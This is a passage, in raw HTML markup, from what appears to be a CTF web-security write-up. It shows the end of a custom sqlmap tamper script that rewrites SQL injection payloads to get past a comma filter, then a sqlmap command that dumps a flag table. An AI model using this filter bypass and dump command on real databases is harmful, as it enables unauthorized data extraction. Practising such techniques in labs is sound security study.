payload = payload[:index] + newVal + payload[end + <span class="hljs-number">1</span>:]<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">return</span> payload<br><br>    retVal = payload<br>    <br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = re.sub(<span class="hljs-string">r&#x27;(?i)TIMESTAMPADD\(\w+,\d+,NULL\)&#x27;</span>, <span class="hljs-string">&#x27;NULL&#x27;</span>, retVal)<br>        retVal = re.sub(<span class="hljs-string">r&#x27;(?i)MID\((.+?)\s*,\s*(\d+)\s*\,\s*(\d+)\s*\)&#x27;</span>, <span class="hljs-string">&#x27;MID(\g&lt;1&gt; FROM \g&lt;2&gt; FOR \g&lt;3&gt;)&#x27;</span>, retVal)<br>        retVal = commalessif(retVal)<br>        retVal = commalessifnull(retVal)<br>        retVal = re.sub(<span class="hljs-string">r&#x27;(?i)LIMIT\s*(\d+),\s*(\d+)&#x27;</span>, <span class="hljs-string">&#x27;LIMIT \g&lt;2&gt; OFFSET \g&lt;1&gt;&#x27;</span>, retVal)<br><br>    <span class="hljs-keyword">return</span> retVal<br></code></pre></div></td></tr></table></figure><p>运行sqlmap：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">sqlmap<span class="hljs-selector-class">.py</span> -r post<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--level</span>=<span class="hljs-number">3</span> <span class="hljs-attr">--skip</span>=<span class="hljs-string">&quot;user-agent,referer&quot;</span> -v <span class="hljs-number">3</span> <span class="hljs-attr">--tamper</span>=commalessmysql -D web4 -T flag -C flag <span class="hljs-attr">--dump</span><br></code></pre></div></td></tr></table></figure><p>得到flag。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
